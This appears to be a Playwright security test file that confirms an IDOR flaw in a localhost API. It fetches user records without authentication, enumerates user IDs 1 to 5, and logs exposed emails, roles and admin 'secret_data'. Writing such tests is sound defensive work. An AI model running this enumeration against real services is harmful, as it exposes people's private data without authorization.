import { test, expect, APIRequestContext } from '@playwright/test';

const API_URL = 'http://localhost:3000/api';

test.describe('/api/user/:id (IDOR)', () => {
  test('GET user data without authentication', async ({ request }: { request: APIRequestContext }) => {
    const response = await request.get(`${API_URL}/user/1`);
    expect(response.ok()).toBeTruthy();
    
    const userData = await response.json();
    expect(userData).toHaveProperty('secret_data');
    expect(userData).toHaveProperty('email');
    
    console.log('✓ IDOR vulnerability confirmed - Accessed user 1 data');
    console.log(`  User: ${userData.username}, Secret: ${userData.secret_data}`);
  });

  test('GET enumerate multiple users via IDOR', async ({ request }: { request: APIRequestContext }) => {
    const users = [];
    
    for (let i = 1; i <= 5; i++) {
      const response = await request.get(`${API_URL}/user/${i}`);
      
      if (response.ok()) {
        const userData = await response.json();
        users.push({
          id: userData.id,
          username: userData.username,
          role: userData.role
        });
      }
    }
    
    expect(users.length).toBeGreaterThan(0);
    console.log(`✓ Enumerated ${users.length} users via IDOR`);
  });

  test('GET admin user data without authorization', async ({ request }: { request: APIRequestContext }) => {
    const response = await request.get(`${API_URL}/user/1`);
    const userData = await response.json();
    
    if (userData.role === 'admin') {
      console.log('✓ Admin secret data exposed:', userData.secret_data);
    }
  });
});
